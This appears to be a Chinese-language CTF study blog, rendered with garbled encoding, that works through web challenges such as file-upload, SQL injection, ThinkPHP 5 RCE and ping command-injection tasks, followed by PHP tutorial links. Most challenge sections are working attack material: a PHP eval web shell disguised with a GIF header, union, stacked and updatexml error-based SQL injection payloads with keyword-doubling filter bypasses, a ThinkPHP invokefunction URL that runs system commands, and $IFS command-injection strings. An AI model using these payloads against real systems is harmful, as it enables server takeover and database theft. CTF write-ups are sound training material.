id="ACTF2020-æ–°ç”Ÿèµ›-Upload"><a href="#ACTF2020-æ–°ç”Ÿèµ›-Upload" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]Upload"></a>[ACTF2020 æ–°ç”Ÿèµ›]Upload</h2><p>å°é©¬ï¼š</p><pre><code>GIF89a&lt;?php @eval($_POST[&#39;666&#39;]);?&gt;</code></pre><p>é¦–å…ˆä¸Šä¼ .phpæ–‡ä»¶å‘ç°å¯¹åç¼€è¿›è¡Œäº†é™åˆ¶</p><p>æ”¹ä¸ºshell.php.pngåŒæ—¶æŠ“åŒ…åˆ é™¤png</p><p>å¾—åˆ°ä¸€ä¸ªé¡µé¢ä»¥åæŸ¥çœ‹æºä»£ç å‘ç°ï¼š</p><p>Upload Success! Look here~ ./uplo4d/3d694425bf5c9803db0c7b3d776cd2f1.png</p><p>å‘ç°ç¡®å®å­˜åœ¨ï¼Œä½†æ˜¯è¢«é‡å‘½åäº†ï¼Œè€Œä¸”å˜æˆäº†ä¸€ä¸ªpng</p><p>é‡æ–°å°è¯•åç¼€ç»•è¿‡shell.phtmlï¼ˆé€šè¿‡æŠ“åŒ…ä¿®æ”¹ï¼‰</p><p>å¾—åˆ°ï¼š</p><p>Upload Success! Look here~ ./uplo4d/bd914ca4997d34857501cefab0064162.phtml</p><p>å›åˆ°æ ¹ç›®å½•æŸ¥çœ‹flagå³å¯</p><p>æˆ–è€…æ•°æ®ç»ˆç«¯cat /flag</p><h1 id="2021-01-25"><a href="#2021-01-25" class="headerlink" title="2021-01-25"></a>2021-01-25</h1><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-EasySQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-EasySQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL</h2><p>ç”¨æˆ·åï¼š1â€™ or 1=1#</p><p>å¯†ç ï¼š123</p><p>å¾—åˆ°flagï¼šflag{161e4d70-8d13-4f80-8a96-c01d5eb7b540}</p><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-Havefun"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Havefun" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Havefun"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Havefun</h2><p>æŸ¥çœ‹æºä»£ç ï¼š</p><pre><code>                &lt;!--        $cat=$_GET[&#39;cat&#39;];        echo $cat;        if($cat==&#39;dog&#39;){            echo &#39;Syc{cat_cat_cat_cat}&#39;;        }        --&gt;</code></pre><p>æ„é€ å‚æ•°?cat=dog,ç»“æœç›´æ¥å¾—åˆ°äº†flagï¼šflag{1fb1365e-7d13-4ee4-94ec-e93656f4d96e}</p><p>ä»€ä¹ˆæƒ…å†µï¼Ÿï¼Ÿè¿™ä¹Ÿå¤ªã€‚ã€‚ã€‚</p><h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><p>è¾“å…¥1çš„ç»“æœä¸è¾“å…¥3-2çš„ç»“æœä¸€æ ·ã€‚æ‰€ä»¥åˆ¤æ–­ä¸ºæ•´æ•°å‹æ³¨å…¥ï¼Œæ¥ä¸‹æ¥æ„é€ æ³¨å…¥è¯­å¥ï¼š</p><p>å½“æˆ‘è¾“å…¥-1 union select 1,2#å’Œå…¶ä»–å­—ç¬¦è½¬çš„æ—¶å€™ï¼Œéƒ½ä¼šè¢«è½¬ä¹‰ï¼Œæ‰€ä»¥å°±å¾ˆæœ‰å¯èƒ½æ˜¯è¢«è½¬ä¹‰äº†ï¼Œè”åˆæŸ¥è¯¢æ”¾å¼ƒï¼Œè€ƒè™‘å †å æ³¨å…¥ï¼š</p><p>1;show databases;#ï¼ˆå±•ç°æ‰€æœ‰æ•°æ®åº“ï¼‰</p><p>å¾—åˆ°ç»“æœï¼š</p><pre><code>Array ( [0] =&gt; 1 ) Array ( [0] =&gt; ctf ) Array ( [0] =&gt; ctftraining ) Array ( [0] =&gt; information_schema ) Array ( [0] =&gt; mysql ) Array ( [0] =&gt; performance_schema ) Array ( [0] =&gt; test )</code></pre><p>æˆ‘æ„Ÿè§‰åœ¨testé‡Œé¢ï¼Œæ„é€ è¯­å¥ï¼š1;show tables from test;#ç»“æœæ˜¯ä¸€ç‚¹ä¸å¥½ä½¿</p><p>å½“è¾“å…¥1;show tables;æ—¶å€™å›æ˜¾ï¼š</p><pre><code>Array ( [0] =&gt; 1 ) Array ( [0] =&gt; Flag )</code></pre><p>okï¼Œçœ‹wpå§ï¼šä¹Ÿä¸çŸ¥é“æ˜¯æ€ä¹ˆæƒ³çš„ï¼Œ</p><h3 id="è§£æ³•1ï¼š"><a href="#è§£æ³•1ï¼š" class="headerlink" title="è§£æ³•1ï¼š"></a>è§£æ³•1ï¼š</h3><p>è¾“å…¥çš„å†…å®¹ä¸º*,1</p><p>å†…ç½®çš„sqlè¯­å¥ä¸ºï¼šselect $post[â€˜queryâ€™]||flag from Flag</p><p>å¦‚æœ$post[â€˜queryâ€™]çš„æ•°æ®ä¸º<em>,1ï¼Œsqlè¯­å¥å°±å˜æˆäº†select </em>,1||flag from Flagï¼ˆæ­¤æ—¶||æ˜¯é€»è¾‘â€œæˆ–â€ï¼‰ä¹Ÿå°±æ˜¯select *,1 from Flagï¼Œä¹Ÿå°±æ˜¯ç›´æ¥æŸ¥è¯¢å‡ºäº†Flagè¡¨ä¸­çš„æ‰€æœ‰å†…</p><h3 id="è§£æ³•2ï¼š"><a href="#è§£æ³•2ï¼š" class="headerlink" title="è§£æ³•2ï¼š"></a>è§£æ³•2ï¼š</h3><p>1.è¾“å…¥ 1 æˆ– 0 æŸ¥è¯¢ç»“æœå¦‚å›¾ï¼Œè¦æƒ³åŠæ³•è®© ||ä¸æ˜¯é€»è¾‘æˆ–<br>å®˜æ–¹ç»™çš„ payload æ˜¯1;set sql_mode=PIPES_AS_CONCAT;select 1</p><p>æ‹¼æ¥ä¸€ä¸‹å°±æ˜¯select 1;set sql_mode=PIPES_AS_CONCAT;select 1||flag from Flag</p><p>å…³äº sql_mode : å®ƒå®šä¹‰äº† MySQL åº”æ”¯æŒçš„ SQL è¯­æ³•ï¼Œä»¥åŠåº”è¯¥åœ¨æ•°æ®ä¸Šæ‰§è¡Œä½•ç§ç¡®è®¤æ£€æŸ¥ï¼Œå…¶ä¸­çš„PIPES_AS_CONCATå°† ||è§†ä¸ºå­—ç¬¦ä¸²çš„è¿æ¥æ“ä½œç¬¦è€Œé â€œæˆ–â€ è¿ç®—ç¬¦</p><p>2.è¿™ä¸ªæ¨¡å¼ä¸‹è¿›è¡ŒæŸ¥è¯¢çš„æ—¶å€™ï¼Œä½¿ç”¨å­—æ¯è¿æ¥ä¼šæŠ¥é”™ï¼Œä½¿ç”¨æ•°å­—è¿æ¥æ‰ä¼šæŸ¥è¯¢å‡ºæ•°æ®ï¼Œå› ä¸ºè¿™ä¸ª||ç›¸å½“äºæ˜¯å°† select 1 å’Œ select flag from flag çš„ç»“æœæ‹¼æ¥åœ¨ä¸€èµ·</p><p>è‡ªæˆ‘ç†è§£ï¼šsql_mode=PIPES_AS_CONCATå°†åé¢æŸ¥è¯¢çš„ç»“æœåŒæ—¶è¾“å‡º</p><p>ä¸é”™ï¼ŒæŒºå¥½çš„é¢˜ï¼Œç›—ï¼š</p><pre><code>é™„åŠ å‡ ç§å¸¸è§çš„sql_modeå€¼çš„ä»‹ç»ï¼šå‡ ç§å¸¸è§çš„modeä»‹ç»ONLY_FULL_GROUP_BYï¼šå‡ºç°åœ¨selectè¯­å¥ã€HAVINGæ¡ä»¶å’ŒORDER BYè¯­å¥ä¸­çš„åˆ—ï¼Œå¿…é¡»æ˜¯GROUP BYçš„åˆ—æˆ–è€…ä¾èµ–äºGROUP BYåˆ—çš„å‡½æ•°åˆ—ã€‚NO_AUTO_VALUE_ON_ZEROï¼šè¯¥å€¼å½±å“è‡ªå¢é•¿åˆ—çš„æ’å…¥ã€‚é»˜è®¤è®¾ç½®ä¸‹ï¼Œæ’å…¥0æˆ–NULLä»£è¡¨ç”Ÿæˆä¸‹ä¸€ä¸ªè‡ªå¢é•¿å€¼ã€‚å¦‚æœç”¨æˆ·å¸Œæœ›æ’å…¥çš„å€¼ä¸º0ï¼Œè€Œè¯¥åˆ—åˆæ˜¯è‡ªå¢é•¿çš„ï¼Œé‚£ä¹ˆè¿™ä¸ªé€‰é¡¹å°±æœ‰ç”¨äº†ã€‚STRICT_TRANS_TABLESï¼šåœ¨è¯¥æ¨¡å¼ä¸‹ï¼Œå¦‚æœä¸€ä¸ªå€¼ä¸èƒ½æ’å…¥åˆ°ä¸€ä¸ªäº‹åŠ¡è¡¨ä¸­ï¼Œåˆ™ä¸­æ–­å½“å‰çš„æ“ä½œï¼Œå¯¹éäº‹åŠ¡è¡¨ä¸åšé™åˆ¶NO_ZERO_IN_DATEï¼šè¿™ä¸ªæ¨¡å¼å½±å“äº†æ˜¯å¦å…è®¸æ—¥æœŸä¸­çš„æœˆä»½å’Œæ—¥åŒ…å«0ã€‚å¦‚æœå¼€å¯æ­¤æ¨¡å¼ï¼Œ2016-01-00æ˜¯ä¸å…è®¸çš„ï¼Œä½†æ˜¯0000-02-01æ˜¯å…è®¸çš„ã€‚å®ƒå®é™…çš„è¡Œä¸ºå—åˆ° strict modeæ˜¯å¦å¼€å¯çš„å½±å“1ã€‚NO_ZERO_DATEï¼šè®¾ç½®è¯¥å€¼ï¼Œmysqlæ•°æ®åº“ä¸å…è®¸æ’å…¥é›¶æ—¥æœŸã€‚å®ƒå®é™…çš„è¡Œä¸ºå—åˆ° strictmodeæ˜¯å¦å¼€å¯çš„å½±å“2ã€‚ERROR_FOR_DIVISION_BY_ZEROï¼šåœ¨INSERTæˆ–UPDATEè¿‡ç¨‹ä¸­ï¼Œå¦‚æœæ•°æ®è¢«é›¶é™¤ï¼Œåˆ™äº§ç”Ÿé”™è¯¯è€Œéè­¦å‘Šã€‚å¦‚æœæœªç»™å‡ºè¯¥æ¨¡å¼ï¼Œé‚£ä¹ˆæ•°æ®è¢«é›¶é™¤æ—¶MySQLè¿”å›NULLNO_AUTO_CREATE_USERï¼šç¦æ­¢GRANTåˆ›å»ºå¯†ç ä¸ºç©ºçš„ç”¨æˆ·NO_ENGINE_SUBSTITUTIONï¼šå¦‚æœéœ€è¦çš„å­˜å‚¨å¼•æ“è¢«ç¦ç”¨æˆ–æœªç¼–è¯‘ï¼Œé‚£ä¹ˆæŠ›å‡ºé”™è¯¯ã€‚ä¸è®¾ç½®æ­¤å€¼æ—¶ï¼Œç”¨é»˜è®¤çš„å­˜å‚¨å¼•æ“æ›¿ä»£ï¼Œå¹¶æŠ›å‡ºä¸€ä¸ªå¼‚å¸¸PIPES_AS_CONCATï¼šå°†â€||â€è§†ä¸ºå­—ç¬¦ä¸²çš„è¿æ¥æ“ä½œç¬¦è€Œéæˆ–è¿ç®—ç¬¦ï¼Œè¿™å’ŒOracleæ•°æ®åº“æ˜¯ä¸€æ ·çš„ï¼Œä¹Ÿå’Œå­—ç¬¦ä¸²çš„æ‹¼æ¥å‡½æ•°Concatç›¸ç±»ä¼¼ANSI_QUOTESï¼šå¯ç”¨ANSI_QUOTESåï¼Œä¸èƒ½ç”¨åŒå¼•å·æ¥å¼•ç”¨å­—ç¬¦ä¸²ï¼Œå› ä¸ºå®ƒè¢«è§£é‡Šä¸ºè¯†åˆ«ç¬¦</code></pre><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-LoveSQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-LoveSQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL</h2><p>åç«¯ç»“æ„æ˜¯username=â€™â€™passwd=â€™â€™</p><p>æ³¨å…¥å¼€å§‹ï¼šusername=â€™1â€™ or 1 = 1#passwd=â€™â€™</p><p>å¾—åˆ°å›æ˜¾ï¼š<strong>Hello adminï¼</strong></p><p><strong>Your password is â€˜817b66fd2bafc98336e2618cf0e66578â€™</strong></p><p>æ„é€ username=â€™adminâ€™passwd=â€™817b66fd2bafc98336e2618cf0e66578â€™</p><p>å¯†ç æ˜¯flagå˜›ã€‚ã€‚ã€‚flag{817b66fd2bafc98336e2618cf0e66578}ä¹Ÿä¸å¯¹ï¼Œéš¾é“å¯†ç æ˜¯ä¸ªè¡¨ï¼Ÿï¼Ÿç»§ç»­æ„é€ ï¼š</p><p>username=â€™adminâ€™ union select table_name from 817b66fd2bafc98336e2618cf0e66578#â€™passwd=â€™â€™</p><p>å¾—åˆ°ï¼š<strong>Table â€˜geek.817b66fd2bafc98336e2618cf0e66578â€™ doesnâ€™t exist</strong></p><p>ç»§ç»­ï¼šusername=â€™adminâ€™ order by 3#â€™passwd=â€™â€™</p><p>è¿”å›ç»“æœä¸æˆåŠŸç™»é™†adminç»“æœä¸€æ ·</p><p>ç»§ç»­adminâ€™ order by 4#</p><p>å¾—åˆ°å›æ˜¾ï¼š<strong>Unknown column â€˜4â€™ in â€˜order clauseâ€™</strong>ï¼Œå¥½ï¼Œ3åˆ—ç¡®å®šäº†ï¼Œç»§ç»­æ„é€ ï¼š1â€™ union select 1,2,3#å¾—åˆ°ï¼š</p><p><strong>Hello 2ï¼</strong><br><strong>Your password is â€˜3â€™</strong></p><p>æ‡‚äº†ï¼š</p><pre><code>1&#39; union select 1,2,database()#</code></pre><p>å¾—åˆ°æ•°æ®åº“<strong>geek</strong></p><pre><code>1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#</code></pre><p>å¾—åˆ°å›æ˜¾ï¼š<strong>Hello 2ï¼Your password is â€˜geekuser,l0ve1ysq1â€™</strong></p><pre><code>1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;l0ve1ysq1&#39;#</code></pre><p>å¾—åˆ°å›æ˜¾ï¼š<strong>Hello 2ï¼Your password is â€˜id,username,passwordâ€™</strong></p><pre><code>1&#39; union select 1,2,group_concat(password) from l0ve1ysq1#</code></pre><p>flag{7aa6a786-5f9b-4a75-a742-5b380e79dcd2}</p><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-BabySQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-BabySQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL</h2><p>å…¶å®è¿™ä¸ªé¢˜ä¸lovesqlç›¸ä¼¼</p><p>è¿›è¡Œäº†è¿‡æ»¤,è¾“å…¥1â€™ or 1=1#å‘ç°å˜æˆäº†ï¼š â€˜1=1#â€™</p><p>å¯èƒ½è¿‡æ»¤å­—ç¬¦ï¼š select or and union from where</p><p>è¾“å…¥ï¼š</p><pre><code>1&#39; oorr 1=1#</code></pre><p>å¾—åˆ°ï¼š<strong>Hello adminï¼Your password is â€˜232dc50f903a404ea874ef30b680a9a4â€™</strong></p><pre><code>1&#39; uniunionon selselectect 1,2,3#</code></pre><p>å¾—åˆ°å›æ˜¾ï¼š<strong>Hello 2ï¼Your password is â€˜3â€™</strong></p><pre><code>1&#39; uniunionon selselectect 1,2,database()#</code></pre><p>å¾—åˆ°å›æ˜¾ï¼š<strong>Hello 2ï¼Your password is â€˜geekâ€™</strong>ï¼ˆæ•°æ®åº“geekï¼‰</p><pre><code>1&#39; uniunionon selselectect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_name=&#39;geek&#39;#</code></pre><p>å¾—åˆ°å›æ˜¾ï¼š<strong>Table â€˜infmation_schema.tablesâ€™ doesnâ€™t exist</strong></p><p>æ³¨æ„ï¼šæ˜¯informationï¼Œæ•…informationæ”¹ä¸ºinfoorrmation</p><p>ä½†æ˜¯æ²¡æœ‰è¿”å›å€¼</p><pre><code>1&#39; uniunionon selselectect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=&#39;geek&#39;#</code></pre><p>å¾—åˆ°ï¼š<strong>Hello 2ï¼Your password is â€˜b4bsql,geekuserâ€™</strong></p><p>å¾—åˆ°è¡¨ï¼šb4bsql,geekuser</p><pre><code>1&#39; uniunionon selselectect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name=&#39;b4bsql&#39;#</code></pre><p>å¾—åˆ°å›æ˜¾ï¼š<strong>Hello 2ï¼Your password is â€˜id,username,passwordâ€™</strong></p><p>è¯»å–åˆ—ä¸­çš„å­—æ®µ</p><pre><code>1&#39; uniunionon selselectect 1,2,group_concat(passwoorrd) frfromom b4bsql#</code></pre><p>flag{363a0dd2-accf-4355-878e-84eaf3f6f674}</p><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL</h2><p>updatexml()ï¼Œextractvalue()æŠ¥é”™æ³¨å…¥è§£å†³é—®é¢˜ï¼Œç»è¿‡æˆ‘åˆ†æï¼Œè¿™ä¸¤ä¸ªæŠ¥é”™å‡½æ•°è¯­å¥ç›¸åŒã€‚</p><p>åˆ†æè¯­å¥ï¼š</p><p>database()</p><p>select(())</p><p>concat(0x7e,(),0x7e)</p><p>undatexml(1,,1)</p><p>extractvalue(1,,1)</p><p>æ³¨å…¥å¥å¼ï¼š</p><pre><code>admin&#39;or(updatexml(1,concat(0x7e,(select(database())),0x7e),1))#</code></pre><p>å¾—åˆ°å›æ˜¾ï¼š<strong>XPATH syntax error: â€˜<del>geek</del>â€˜</strong>ï¼ˆæ•°æ®åº“ï¼‰</p><pre><code>cnm&#39;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#39;geek&#39;)),0x7e),1))#</code></pre><p>å¾—åˆ°å›æ˜¾ï¼š<strong>XPATH syntax error: â€˜<del>H4rDsq1</del>â€˜</strong>ï¼ˆè¡¨ï¼‰</p><pre><code>cnm&#39;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;H4rDsq1&#39;)),0x7e),1))#</code></pre><p>å¾—åˆ°å›æ˜¾ï¼š<strong>XPATH syntax error: â€˜<del>id,username,password</del>â€˜</strong></p><pre><code>cnm&#39;or(updatexml(1,concat(0x7e,(select(group_concat(passWord))from(H4rDsq1)),0x7e),1))#</code></pre><p>å¾—åˆ°å›æ˜¾ï¼š<strong>XPATH syntax error: â€˜~flag{576fb8c1-905c-4202-8f82-60â€™</strong></p><p>åªæ˜¯å¾—åˆ°äº†ä¸€åŠflag</p><pre><code>cnm&#39;or(updatexml(1,concat(0x7e,(select(group_concat((right(password,30))))from(H4rDsq1)),0x7e),1))#</code></pre><p>å¾—åˆ°å›æ˜¾ï¼šXPATH syntax error: â€˜<del>1-905c-4202-8f82-605354bf4c57}</del>â€˜</p><p>flag{576fb8c1-905c-4202-8f82-605354bf4c57}</p><p>å˜¶~ä¸é”™</p><h1 id="2021-01-26"><a href="#2021-01-26" class="headerlink" title="2021-01-26"></a>2021-01-26</h1><p>starsnowctfï¼š<a href="http://ctf.starsnowsec.cn/challenges" target="_blank" rel="noopener">http://ctf.starsnowsec.cn/challenges</a></p><h2 id="Rao"><a href="#Rao" class="headerlink" title="Rao"></a>Rao</h2><pre><code>&lt;?php  if (isset($_POST[&quot;login&quot;]))  {  if (isset($_POST[&#39;yingzi&#39;]))  {    if (preg_match(&quot;[a-zA-Z0-9]&quot;, $_POST[&#39;yingzi&#39;]) === FALSE)    {      exit(&#39;&lt;script&gt;alert(&quot;give you flag)&quot;)&lt;/script&gt;&#39;);    }    elseif (strlen($_POST[&#39;yingzi&#39;]) &lt; 10 &amp;&amp; $_POST[&#39;yingzi&#39;] &gt; 987654321)    {      if (strpos($_POST[&#39;yingzi&#39;], &#39;#BIG#&#39;) !== FALSE)      {        if (!is_array($_POST[&#39;yingzi&#39;])) {        include(&quot;./flag.php&quot;);        echo &quot;Congratulations! FLAG is : &quot;.$flag;        }        else      {        exit(&#39;&lt;script&gt;alert(&quot;wtf&quot;)&lt;/script&gt;&#39;);      }      }      else      {        exit(&#39;&lt;script&gt;alert(&quot;wtf&quot;)&lt;/script&gt;&#39;);      }    }    else    {      exit(&#39;&lt;script&gt;alert(&quot;wtf&quot;)&lt;/script&gt;&#39;);    }  }}show_source(__FILE__);?&gt;</code></pre><p>é€ä¸€åˆ†æï¼š</p><p>1.é¦–å…ˆ</p><pre><code>&lt;?php  if (isset($_POST[&quot;login&quot;]))  {  if (isset($_POST[&#39;yingzi&#39;]))</code></pre><p>åˆ¤æ–­æ˜¯å¦è®¾ç½®äº†è¿™ä¸¤ä¸ªå‚æ•°</p><p>2.å…¶æ¬¡</p><pre><code>if (preg_match(&quot;[a-zA-Z0-9]&quot;, $_POST[&#39;yingzi&#39;]) === FALSE)</code></pre><p>å°†å‚æ•°yingzié‡Œé¢çš„å€¼è¿›è¡Œæ­£åˆ™åŒ¹é…ï¼Œè¿™å°±æ„å‘³ç€å¿…é¡»æ˜¯26è‹±æ–‡å­—æ¯å¤§å°å†™+æ•°å­—</p><p>3.ç„¶å</p><pre><code> elseif (strlen($_POST[&#39;yingzi&#39;]) &lt; 10 &amp;&amp; $_POST[&#39;yingzi&#39;] &gt; 987654321)</code></pre><p>åˆ¤æ–­yingziä¼ çš„å‚æ•°é•¿åº¦æ˜¯å¦å°äº10åŒæ—¶æ»¡è¶³yingziä¼ å…¥çš„å‚æ•°æ•°å€¼å¤§äº987654321</p><p>4.å†å°±æ˜¯</p><pre><code> if (strpos($_POST[&#39;yingzi&#39;], &#39;#BIG#&#39;) !== FALSE)</code></pre><p>strpos() å‡½æ•°æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ã€‚</p><p><strong>æ³¨é‡Šï¼š</strong>strpos() å‡½æ•°å¯¹å¤§å°å†™æ•æ„Ÿã€‚</p><pre><code>strpos(string,find,start)string    å¿…éœ€ã€‚è§„å®šè¦æœç´¢çš„å­—ç¬¦ä¸²ã€‚find    å¿…éœ€ã€‚è§„å®šè¦æŸ¥æ‰¾çš„å­—ç¬¦ä¸²ã€‚start    å¯é€‰ã€‚è§„å®šåœ¨ä½•å¤„å¼€å§‹æœç´¢ã€‚</code></pre><p>ä¹Ÿå°±æ˜¯è¯´åˆ©ç”¨è¿™ä¸ªæ¥æ£€ç´¢yingziä¸­æ˜¯å¦å«æœ‰#BIG#</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8826%E6%97%A52148_2.png" alt></p><p>Congratulations! FLAG is : flag{rao_rao_rao}</p><p>è§£é‡Šï¼š9e99=9*10^99</p><h2 id="ThinkPHP-5-Rce"><a href="#ThinkPHP-5-Rce" class="headerlink" title="[ThinkPHP]5-Rce"></a>[ThinkPHP]5-Rce</h2><p>Thinkphp5 5.0.22/5.1.29è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼š</p><pre><code>/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat /flag</code></pre><h2 id="Mini-httpd-2018"><a href="#Mini-httpd-2018" class="headerlink" title="Mini_httpd 2018"></a>Mini_httpd 2018</h2><pre><code>GET /flag HTTP/1.1Host: Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: close</code></pre><p>læ¼æ´å¤ç°ï¼š</p><p><a href="https://blog.csdn.net/xuandao_ahfengren/article/details/106854028" target="_blank" rel="noopener">https://blog.csdn.net/xuandao_ahfengren/article/details/106854028</a></p><h1 id="2021-01-27"><a href="#2021-01-27" class="headerlink" title="2021-01-27"></a>2021-01-27</h1><p>å­¦ä¹ php</p><p><a href="https://www.runoob.com/php/php-syntax.html" target="_blank" rel="noopener">PHP è¯­æ³•</a></p><p><a href="https://www.runoob.com/php/php-variables.html" target="_blank" rel="noopener">PHP å˜é‡</a></p><p><a href="https://www.runoob.com/php/php-echo-print.html" target="_blank" rel="noopener">PHP echo/print</a></p><p><a href="https://www.runoob.com/php/php-datatypes.html" target="_blank" rel="noopener">PHP æ•°æ®ç±»å‹</a></p><p><a href="https://www.runoob.com/php/php-types-comparisons.html" target="_blank" rel="noopener">PHP ç±»å‹æ¯”è¾ƒ</a></p><p><a href="https://www.runoob.com/php/php-constants.html" target="_blank" rel="noopener">PHP å¸¸é‡</a></p><p><a href="https://www.runoob.com/php/php-string.html" target="_blank" rel="noopener">PHP å­—ç¬¦ä¸²</a></p><p><a href="https://www.runoob.com/php/php-operators.html" target="_blank" rel="noopener">PHP è¿ç®—ç¬¦</a></p><h1 id="2021-01-28"><a href="#2021-01-28" class="headerlink" title="2021-01-28"></a>2021-01-28</h1><p><a href="https://www.runoob.com/php/php-if-else.html" target="_blank" rel="noopener">PHP Ifâ€¦Else</a></p><p><a href="https://www.runoob.com/php/php-switch.html" target="_blank" rel="noopener">PHP Switch</a></p><p><a href="https://www.runoob.com/php/php-arrays.html" target="_blank" rel="noopener">PHP æ•°ç»„</a></p><p><a href="https://www.runoob.com/php/php-arrays-sort.html" target="_blank" rel="noopener">PHP æ•°ç»„æ’åº</a></p><p><a href="https://www.runoob.com/php/php-superglobals.html" target="_blank" rel="noopener">PHP è¶…çº§å…¨å±€å˜é‡</a></p><p><a href="https://www.runoob.com/php/php-looping.html" target="_blank" rel="noopener">PHP While å¾ªç¯</a></p><p><a href="https://www.runoob.com/php/php-looping-for.html" target="_blank" rel="noopener">PHP For å¾ªç¯</a></p><p><a href="https://www.runoob.com/php/php-functions.html" target="_blank" rel="noopener">PHP å‡½æ•°</a></p><h1 id="2021-01-29"><a href="#2021-01-29" class="headerlink" title="2021-01-29"></a>2021-01-29</h1><p>é»‘é©¬æ•™ç¨‹-p53</p><h1 id="2021-01-30"><a href="#2021-01-30" class="headerlink" title="2021-01-30"></a>2021-01-30</h1><p>é»‘é©¬æ•™ç¨‹p54+16=p70</p><h1 id="2021-01-31"><a href="#2021-01-31" class="headerlink" title="2021-01-31"></a>2021-01-31</h1><p>é»‘é©¬æ•™ç¨‹p70+16=p86</p><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-Secret-File"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Secret-File" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File</h2><p>æ€ä¹ˆè¯´å‘¢~ï¼Œä¸€åˆ‡éƒ½åœ¨æºä»£ç é‡Œé¢</p><p>é—¯å…³æ€»ç»“ï¼š</p><p>1.å¦‚æœè¯´å·²ç»å±•ç¤ºå®Œäº†ï¼Œä½†æ˜¯ä½ ä»€ä¹ˆéƒ½ä¸çŸ¥é“ï¼Œé‚£ä¹ˆåªèƒ½è¯´æ˜ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯ï¼šä½ å¤ªæ…¢äº†ï¼Œéœ€è¦ä¸€å¸§ä¸€å¸§çš„æŠ“åŒ…æ¥è¯»å–2.è¯´flagå°±åœ¨è¿™ä¸ªé¡µé¢ï¼Œé‚£ä¹ˆå°±æ˜¯åœ¨æºä»£ç é‡Œé¢ï¼Œä½†æ˜¯æºä»£ç é‡Œé¢æ²¡æœ‰çš„è¯ï¼Œé‚£ä¹ˆç”¨php://filteræ¥è¯»å–</p><p>å‡½æ•°ç§¯ç´¯ï¼š</p><p>stristr() å‡½æ•°æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ã€‚å¦‚æœæˆåŠŸï¼Œåˆ™è¿”å›å­—ç¬¦ä¸²çš„å…¶ä½™éƒ¨åˆ†ï¼ˆä»åŒ¹é…ç‚¹ï¼‰ã€‚å¦‚æœæ²¡æœ‰æ‰¾åˆ°è¯¥å­—ç¬¦ä¸²ï¼Œåˆ™è¿”å› falseã€‚</p><h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><p>çœ‹äº†åˆ«äººçš„wpï¼ŒçŸ¥é“è¿™æ˜¯é€šè¿‡æ„é€ æ¥å¾—åˆ°å‘½ä»¤æ‰§è¡Œçš„æ•ˆæœï¼š</p><p>?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php</p><p>/?ip=;cat$IFS$9`ls``ï¼ˆç›´æ¥å°†å½“å‰ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶å…¨éƒ¨catå‡ºæ¥ï¼ŒæŸ¥çœ‹æºç å‘ç°flagï¼‰</p><p>å…³äºpreg_match() å‡½æ•°ï¼š<a href="https://www.runoob.com/php/php-preg_match.html" target="_blank" 